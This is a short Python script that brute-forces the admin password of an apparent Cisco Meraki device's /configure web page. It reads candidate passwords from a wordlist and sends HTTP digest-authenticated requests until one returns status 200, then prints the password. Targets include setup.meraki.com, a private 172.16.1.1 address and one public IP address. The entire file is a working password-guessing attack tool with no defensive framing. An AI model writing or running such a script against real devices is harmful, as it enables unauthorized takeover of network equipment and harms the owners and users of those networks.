import requests
from requests.auth import HTTPDigestAuth

passwordcounter = 0

testurl = 'https://www.google.com'
url1 = 'http://172.16.1.1/configure'
url2 = 'http://setup.meraki.com/configure'
url3 = 'http://138.207.175.210/configure'
url4 = 'http://172.16.1.1/configure/index.cgi'


with open('pswd.txt') as file:
    passwords = [line.rstrip() for line in file]


while True:
    request = requests.head(url2, auth=HTTPDigestAuth('admin', passwords[passwordcounter]))
    if request.status_code == 200:
        print(f'1, Success! Password is \"{passwords[passwordcounter]}\"')
        break
    print('0', end=' ')
    passwordcounter += 1


# r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
# print(r.status_code)
